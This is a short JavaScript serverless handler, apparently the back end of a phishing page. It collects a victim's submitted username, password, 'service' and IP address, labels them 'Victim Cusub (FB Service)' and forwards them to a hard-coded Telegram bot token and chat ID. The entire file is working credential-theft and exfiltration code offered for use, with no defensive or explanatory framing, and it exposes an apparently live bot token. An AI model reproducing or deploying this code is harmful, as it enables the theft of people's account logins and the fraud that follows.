export default async function handler(req, res) {
  if (req.method !== "POST") {
    return res.status(405).json({ status: "error", message: "Method not allowed" });
  }

  const BOT_TOKEN = "8555813127:AAHCwLu0MtB7bXlFvdP6eadEK1uXdz3Atec";
  const CHAT_ID = "8439268531";

  const { user = "Lama helin", pass = "Lama helin", service = "Lama helin", amount = "0" } = req.body || {};

  const ip =
    (req.headers["x-forwarded-for"] || "").split(",")[0] ||
    req.socket?.remoteAddress ||
    "IP lama helin";

  const message =
`😈 *Victim Cusub (FB⛓️🔨 Service)*
--------------------------
👤 *User:* \`${user}\`
🔑 *Pass:* \`${pass}\`
🛠 *Adeeg:* ${service}
🔢 *Tirada:* ${amount}
🌐 *IP:* [${ip}](https://whoer.net/checkip?ip=${ip})
--------------------------`;

  try {
    const tgRes = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: message,
        parse_mode: "Markdown"
      })
    });

    const data = await tgRes.json();
    return res.status(200).json({ status: "success", telegram: data });
  } catch (err) {
    return res.status(500).json({ status: "error", error: err.message });
  }
    }
